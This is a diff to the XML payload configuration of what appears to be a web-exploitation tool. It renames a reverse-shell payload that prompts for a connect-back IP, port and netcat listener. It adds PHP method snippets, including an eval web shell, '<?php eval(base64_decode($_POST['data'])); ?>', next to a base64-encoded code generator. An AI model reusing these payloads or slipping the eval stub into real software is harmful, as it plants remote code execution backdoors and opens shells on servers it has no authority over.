@@ -24,7 +24,7 @@
 	</exec_methods>
 	
 	<payloads>
-		<payload name="Spawn reverse shell" dobase64="0" inshell="0">
+		<payload name="Spawn pentestmonkey's reverse shell" dobase64="0" inshell="0">
 			<input type="question" text="IP Address to connect back to: " placeholder="__IP__" />
 			<input type="question" text="The Port it should connect back: " placeholder="__PORT__" />
 			<input type="wait"     text="Make your netcat server ready and hit enter..." />
@@ -42,6 +42,8 @@
 	
 	<methods>
 		<quiz source="cm5kID0gc2VsZi5nZXRSYW5kb21TdHIoKQpwaHBjb2RlID0gImVjaG8gIgpmb3IgYyBpbiBybmQ6CiAgICBwaHBjb2RlICs9ICJjaHIoJWQpLiIlKG9yZChjKSkKcGhwY29kZSA9ICI8P3BocCAlczsgPz4iICUocGhwY29kZVs6LTFdKQpyZXQgPSAocGhwY29kZSwgcm5kKQo=" />
+		<print source="&lt;?php echo '__PLACEHOLDER__'; ?&gt;" />
+		<eval_kickstarter source="&lt;?php eval(base64_decode($_POST['data'])); ?&gt;" />
 	</methods>
 	
 	<detectors>
